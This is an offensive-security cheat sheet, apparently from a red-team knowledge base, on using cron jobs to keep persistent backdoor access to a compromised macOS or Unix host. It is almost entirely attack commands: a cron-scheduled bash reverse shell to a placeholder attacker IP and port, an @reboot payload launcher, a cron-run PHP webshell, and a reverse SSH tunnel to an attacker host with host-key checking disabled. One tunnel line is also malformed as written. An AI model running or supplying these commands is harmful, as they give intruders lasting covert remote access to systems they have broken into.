---
author(s):
  - Userware
tags:
  - post-exploitation
  - maintaining-access
  - persistence
  - living-off-the-land
  - osx
---
# Living off the Land

## 01 - Usage

> [!IMPORTANT] Conditions
> Cron job service must be enabled.

Open an editor via crontab.

```
$ sudo crontab -e
```

This will execute every minute to trigger the backdoor.

```
$ sudo echo "* * * * * <commands>" >> /etc/crontab

$ sudo echo "$(echo '* * * * * <commands>')" | crontab -

$ echo "* * * * * <commands>" | crontab -

$ echo "$(echo '* * * * * <commands>')" | crontab -

$ crontab -l
```

## 02 - Callback Payloads

Reverse Shell Backdoor

```
$ sudo echo "* * * * * /bin/bash -i >& /dev/tcp/<IP>/<PORT> 0>&1" >> /etc/crontab

$ sudo echo "@reboot nohup /home/<username>/.directory/payload" >> /etc/crontab
```

Webshell backdoor

```
$ sudo echo "* * * * * php -f /var/www/html/logout.php" >> /etc/crontab
```

## 03 - Reverse SSH Tunnel

Refer to this [[06 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x07 - Maintaining Access/Persistence/Linux/Remote Login/SSH/Manual/Living off the Land|section]] for more context.

```
$ sudo "* * * * * nohup ssh -i /tmp/keys/id_rsa -NTfCqR [127.0.0.1]:<SOCKS_Proxy> -o \"UserKnownHostsFile=/dev/null StrictHostKeyChecking=no\" <username>@<attacker_IP>" >> /etc/crontab
```

---
## References

### Backlinks

- [[06 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x07 - Maintaining Access/Persistence/OSX/Backdoors/Scheduled Tasks/Malware Development/Helpers]]

- [[06 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x07 - Maintaining Access/Persistence/Linux/Backdoors/Scheduled Tasks/Manual/Living off the Land]]